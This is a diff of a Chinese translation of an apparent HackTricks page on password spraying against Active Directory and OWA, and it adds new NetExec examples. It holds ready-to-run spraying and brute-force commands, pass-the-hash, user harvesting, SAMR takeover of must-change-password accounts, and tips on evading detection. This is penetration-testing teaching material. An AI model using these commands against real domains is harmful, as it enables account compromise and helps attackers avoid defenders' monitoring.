@@ -5,15 +5,16 @@
 
 ## **Password Spraying**
 
-一旦你找到了几个**有效用户名**，你可以针对每个已发现的用户尝试**最常见的密码**（请注意环境的密码策略）。\ **默认** 情况下，**最小** **密码** **长度** 为 **7**。
+一旦你找到几个 **有效的用户名**，你可以对每个被发现的用户尝试最 **常见的密码**（请注意环境的密码策略）。\
+默认情况下，**最小** **密码** **长度** 为 **7**。
 
-常用用户名列表也可能很有用： [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
+常见用户名列表也可能有用： [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
-注意，**如果你尝试了多个错误的密码，可能会锁定一些账户**（默认超过10次）。
+请注意，**如果尝试多个错误密码，可能会锁定一些账户**（默认超过10次）。
 
 ### 获取密码策略
 
-如果你有某些用户凭据或以域用户身份获得了 shell，你可以**使用以下方式获取密码策略**：
+如果你有一些用户凭证或以域用户的身份获得了 shell，你可以**获取密码策略**：
 ```bash
 # From Linux
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
@@ -30,7 +31,7 @@ net accounts
 
 (Get-DomainPolicy)."SystemAccess" #From powerview
 ```
-### 从 Linux（或所有系统）进行利用
+### Exploitation（来自 Linux 或所有平台）
 
 - 使用 **crackmapexec:**
 ```bash
@@ -39,6 +40,21 @@ crackmapexec smb <IP> -u users.txt -p passwords.txt
 ## --local-auth flag indicate to only try 1 time per machine
 crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
 ```
+- 使用 **NetExec (CME successor)** 进行针对性、低噪声的 spraying，跨 SMB/WinRM：
+```bash
+# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
+netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts
+
+# Spray a single candidate password against harvested users over SMB
+netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
+--continue-on-success --no-bruteforce --shares
+
+# Validate a hit over WinRM (or use SMB exec methods)
+netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"
+
+# Tip: sync your clock before Kerberos-based auth to avoid skew issues
+sudo ntpdate <DC_FQDN>
+```
 - 使用 [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
 ```bash
 # Password Spraying
@@ -46,16 +62,16 @@ crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9c
 # Brute-Force
 ./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
 ```
-- [**spray**](https://github.com/Greenwolf/Spray) _**(你可以指定尝试次数以避免触发锁定):**_
+- [**spray**](https://github.com/Greenwolf/Spray) _**(你可以指定尝试次数以避免锁定)：**_
 ```bash
 spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 ```
-- 使用 [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - 不推荐，有时不起作用
+- 使用 [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - 不推荐，偶尔无法工作
 ```bash
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
 ```
-- 使用 **Metasploit** 的 `scanner/smb/smb_login` 模块：
+- 使用 `scanner/smb/smb_login` 模块的 **Metasploit**：
 
 ![](<../../images/image (745).png>)
 
@@ -76,7 +92,7 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-- 使用 [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (它可以默认从域生成用户，并从域获取密码策略并根据该策略限制尝试次数):
+- With [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (默认可以从域生成用户，并会从域获取密码策略并根据其限制尝试次数):
 ```bash
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
@@ -84,9 +100,9 @@ Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
 Invoke-SprayEmptyPassword
 ```
-### 识别并接管 "Password must change at next logon" Accounts (SAMR)
+### 识别并接管 "Password must change at next logon" 账户 (SAMR)
 
-一种低噪声的技术是对账户尝试 benign/empty password，并捕获返回 STATUS_PASSWORD_MUST_CHANGE 的账户，这表示密码被强制过期，可以在不知道旧密码的情况下直接更改。
+一种低噪声的技术是尝试一个无害/空密码并捕获返回 STATUS_PASSWORD_MUST_CHANGE 的账户，这表明密码被强制过期，可以在不知道旧密码的情况下更改它。
 
 Workflow:
 - 枚举用户 (RID brute via SAMR) 以构建目标列表：
@@ -98,12 +114,12 @@ Workflow:
 # NetExec (null/guest) + RID brute to harvest users
 netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
 ```
-- Spray an empty password，并在命中后继续尝试，以捕获那些必须在下次 logon 时更改的账户：
+- Spray 空 password，并在命中时继续尝试，以捕获必须在 next logon 更改的账户：
 ```bash
 # Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
 netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
 ```
-- 对于每个命中，使用 NetExec’s 模块通过 SAMR 更改密码（当设置了 "must change" 时不需要旧密码）：
+- 对于每个命中，通过 SAMR 使用 NetExec’s module 更改密码（当 "must change" 被设置时不需要旧密码）：
 ```bash
 # Strong complexity to satisfy policy
 env NEWPASS='P@ssw0rd!2025#' ; \
@@ -113,26 +129,26 @@ netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"
 netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
 ```
 操作说明：
-- 在进行基于 Kerberos 的操作之前，确保主机时钟与 DC 同步： `sudo ntpdate <dc_fqdn>`。
-- 在某些模块（例如 RDP/WinRM）中，带有 [+] 但没有 (Pwn3d!) 表示 creds 有效，但该账户缺少 interactive logon rights。
+- 在执行基于 Kerberos 的操作前，确保主机时钟与 DC 同步： `sudo ntpdate <dc_fqdn>`.
+- 在某些模块（例如 RDP/WinRM）中，若看到 [+] 但没有 (Pwn3d!)，表示 creds 有效但该账号缺少交互式登录权限。
 
-## 暴力破解
+## Brute Force
 ```bash
 legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
 ```
 ### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)
 
-基于 Kerberos pre-auth 的喷射比 SMB/NTLM/LDAP 绑定尝试产生更少噪音，并且更符合 AD 锁定策略。SpearSpray 结合 LDAP 驱动的定向、模式引擎和策略感知（域策略 + PSOs + badPwdCount 缓冲），以更精确和更安全的方式进行喷射。它还可以在 Neo4j 中标记被攻破的主体以供 BloodHound 路径分析。
+Kerberos pre-auth–based spraying 相较于 SMB/NTLM/LDAP bind attempts 能减少噪声，并且更符合 AD lockout policies。SpearSpray 结合了 LDAP 驱动的目标定位、pattern engine 和策略感知（域策略 + PSOs + badPwdCount 缓冲）来进行精确且安全的喷洒。它还可以在 Neo4j 中标记被攻破的主体以便 BloodHound 路径分析。
 
-关键要点：
-- 使用分页和 LDAPS 支持的 LDAP 用户发现，可选地使用自定义 LDAP 过滤器。
-- 域锁定策略 + PSO 感知过滤，保留可配置的尝试缓冲（阈值）以避免锁定用户。
-- 使用快速 gssapi 绑定的 Kerberos pre-auth 验证（在 DCs 上生成 4768/4771，而不是 4625）。
-- 基于模式的逐用户密码生成，使用诸如姓名和从每个用户的 pwdLastSet 派生的时间变量。
-- 通过线程、抖动和每秒最大请求数来控制吞吐量。
-- 可选的 Neo4j 集成，用于标记被攻破的用户以供 BloodHound 使用。
+Key ideas:
+- LDAP user discovery with paging and LDAPS support, optionally using custom LDAP filters.
+- Domain lockout policy + PSO-aware filtering to leave a configurable attempt buffer (threshold) and avoid locking users.
+- Kerberos pre-auth validation using fast gssapi bindings (generates 4768/4771 on DCs instead of 4625).
+- Pattern-based, per-user password generation using variables like names and temporal values derived from each user’s pwdLastSet.
+- Throughput control with threads, jitter, and max requests per second.
+- Optional Neo4j integration to mark owned users for BloodHound.
 
-基本用法和发现：
+Basic usage and discovery:
 ```bash
 # List available pattern variables
 spearspray -l
@@ -143,7 +159,7 @@ spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local
 # LDAPS (TCP/636)
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
 ```
-目标定位与模式控制：
+目标定位与模式控制:
 ```bash
 # Custom LDAP filter (e.g., target specific OU/attributes)
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
@@ -152,7 +168,7 @@ spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local
 # Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
 ```
-隐蔽与安全控制：
+隐蔽性与安全控制：
 ```bash
 # Control concurrency, add jitter, and cap request rate
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10
@@ -175,27 +191,27 @@ spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local
 ```
 Available variables include:
 - {name}, {samaccountname}
-- Temporal from each user’s pwdLastSet (or whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
-- Composition helpers and org token: {separator}, {suffix}, {extra}
+- 来自每个用户的 pwdLastSet（或 whenCreated）的时间变量： {year}, {short_year}, {month_number}, {month_en}, {season_en}
+- 组合辅助和组织令牌： {separator}, {suffix}, {extra}
 
 Operational notes:
-- 优先使用 -dc 查询 PDC-emulator 以读取最权威的 badPwdCount 和与策略相关的信息。
-- badPwdCount 的重置会在观察窗口之后的下一次尝试触发；使用阈值和时序来保持安全。
-- Kerberos pre-auth 尝试在 DC 监控中以 4768/4771 的形式出现；使用抖动和速率限制以便混入正常流量。
+- 优先使用 -dc 查询 PDC-emulator，以读取最权威的 badPwdCount 和策略相关信息。
+- badPwdCount 的重置在观测窗口之后的下一次尝试时触发；使用阈值和时机来保持安全。
+- Kerberos pre-auth 尝试会在 DC telemetry 中以 4768/4771 的形式出现；使用 jitter 和 rate-limiting 来混入正常流量。
 
-> 提示：SpearSpray 的默认 LDAP 页面大小为 200；根据需要用 -lps 调整。
+> Tip: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.
 
 ## Outlook Web Access
 
 有多个工具可用于 p**assword spraying outlook**。
 
-- 使用 [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
-- 使用 [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
-- 使用 [Ruler](https://github.com/sensepost/ruler) (可靠!)
-- 使用 [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
-- 使用 [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
+- With [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
+- with [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
+- With [Ruler](https://github.com/sensepost/ruler) (reliable!)
+- With [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
+- With [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
 
-要使用这些工具，您需要一个用户列表以及一个 password，或一小组 password 列表用于喷洒。
+要使用这些工具，你需要一个用户列表以及一个密码或一个用于 password spraying 的短密码列表。
 ```bash
 ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
 [x] Failed: larsson:Summer2020
@@ -226,6 +242,7 @@ Operational notes:
 - [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
 - [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
 - [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
+- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
 
 
 {{#include ../../banners/hacktricks-training.md}}
